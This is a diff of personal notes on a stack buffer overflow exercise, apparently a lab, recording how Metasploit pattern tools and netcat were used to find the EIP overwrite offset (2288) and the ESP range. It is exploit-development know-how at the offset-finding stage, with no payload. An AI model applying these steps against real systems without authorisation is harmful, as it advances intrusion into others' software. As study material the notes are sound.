@@ -10,12 +10,18 @@ Steps:
             by the buffer overflow.
             And register ESP appears to point to somewhere in the
             malicious buffer.
-    2. 
+    2. Identified offset that override EIP and that ESP points to
+        `msf-pattern_create -l 10000 | nc 172.29.208.1 7001`
+        EIP is overridden at offset 2288
+            `msf-pattern_offset -l 10000 -q 33794332`
+                => Exact match at offset 2288
+        ESP points to offset 2300 and ends at 4092
+            `msf-pattern_offset -l 10000 -q 6Cy7`
+                => Exact match at offset 2300
+            `msf-pattern_offset -l 10000 -q Fg4F`
+                => Exact match at offset 4092
 
 
 Notes:
-    * Identified offset to override EIP
-        `msf-pattern_create -l 10000 | nc 172.29.208.1 7001`
-        `msf-pattern_offset -l 10000 -q 33794332`
-            => Exact match at offset 2288
+    *
 
